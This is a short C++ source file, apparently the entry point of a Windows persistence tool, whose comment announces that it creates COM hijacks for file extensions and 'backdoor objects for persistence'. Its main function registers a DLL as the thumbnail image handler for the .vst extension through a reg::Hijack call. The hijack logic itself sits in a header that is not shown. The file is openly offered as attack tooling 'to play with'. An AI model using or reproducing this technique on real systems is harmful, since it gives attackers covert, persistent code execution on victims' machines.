#include "reg.h"

/// <summary>
/// Confirmed this can create COM Hijack for extensions and this can create backdoor objects for persistence.
/// Going to do some code cleanup in the next two weeks and write details about how all this works. For those who
/// know whats going on, have fun and play with this, otherwise just wait two weeks and youll get everything you need :) 
/// 
/// (I am too excited so im making this public early.) 
/// </summary>

int wmain()
{

	std::wstring dllPath = L"C:\\Users\\AliSAhmad\\source\\repos\\Test004\\x64\\Debug\\ATLThumbnailImageHandler.dll";
	//GUID guid = reg::CreateBackdoorObj(HKCU, dllPath);
	std::wstring ext = L".vst";
	//reg::AddTechnique(THUMBNAIL_IMAGE_HANDLER, (WCHAR *)ext.c_str(), guid);

	reg::Hijack(THUMBNAIL_IMAGE_HANDLER, (WCHAR*)ext.c_str(), (WCHAR *)dllPath.c_str());

}
